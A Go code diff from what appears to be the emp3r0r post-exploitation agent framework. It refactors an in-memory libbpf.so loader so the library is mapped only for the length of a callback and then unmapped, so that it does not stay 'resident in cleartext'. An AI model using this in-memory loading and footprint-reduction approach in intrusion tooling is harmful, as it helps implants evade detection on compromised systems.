@@ -3,10 +3,11 @@
 // Package libbpf loads libbpf.so in memory and drives its C API through
 // memmod, mirroring the core/lib/coffloader pattern for Linux shared objects.
 //
-// The .so bytes are supplied by the caller (the agent fetches and caches the
-// libbpf dependency, like it does the Windows COFFLoader DLL). The
-// version-sensitive kernel UAPI layouts stay in Go rather than being
-// re-implemented by scripts.
+// Callers normally use WithLibrary, which resolves the "libbpf" dependency
+// through core/lib/memdeps, maps it, runs the callback, and unmaps it before
+// returning. Load is the lower-level escape hatch and leaves unmapping to the
+// caller. The version-sensitive kernel UAPI layouts stay in Go rather than
+// being re-implemented by scripts.
 package libbpf
 
 import (
@@ -14,9 +15,9 @@ import (
 	"errors"
 	"fmt"
 	"runtime"
-	"sync"
 	"unsafe"
 
+	"github.com/jm33-m0/emp3r0r/core/lib/memdeps"
 	"github.com/jm33-m0/emp3r0r/core/lib/memmod"
 	"golang.org/x/sys/unix"
 )
@@ -95,43 +96,17 @@ func (l *Library) Close() {
 	}
 }
 
-var (
-	defaultMu  sync.Mutex
-	defaultLib *Library
-	fetcher    func() ([]byte, error)
-)
-
-// SetFetcher wires the function used to obtain libbpf.so bytes. The agent
-// points this at its dependency fetcher; the default cache is reset so the
-// next Default call reloads.
-func SetFetcher(fn func() ([]byte, error)) {
-	defaultMu.Lock()
-	defer defaultMu.Unlock()
-	fetcher = fn
-	defaultLib = nil
-}
-
-// Default returns a process-wide libbpf library, fetching and mapping it on
-// first use. It returns an error until SetFetcher has been called.
-func Default() (*Library, error) {
-	defaultMu.Lock()
-	defer defaultMu.Unlock()
-	if defaultLib != nil {
-		return defaultLib, nil
-	}
-	if fetcher == nil {
-		return nil, errors.New("libbpf: no library fetcher configured")
-	}
-	data, err := fetcher()
-	if err != nil {
-		return nil, fmt.Errorf("libbpf: fetch library: %w", err)
-	}
-	lib, err := Load(data)
-	if err != nil {
-		return nil, err
-	}
-	defaultLib = lib
-	return lib, nil
+// WithLibrary maps the libbpf dependency, runs fn with it, and unmaps it
+// before returning. The mapping never outlives fn, so libbpf is not left
+// resident in cleartext while no module is using it.
+//
+// Any Object, Program or Link obtained inside fn is only valid until fn
+// returns; callers must not retain them. It returns an error until the agent
+// has wired a dependency resolver (memdeps.SetResolver).
+func WithLibrary(fn func(*Library) error) error {
+	return memdeps.Use("libbpf", func(module *memmod.Module) error {
+		return fn(&Library{module: module})
+	})
 }
 
 // call invokes an exported libbpf function with up to three machine words.
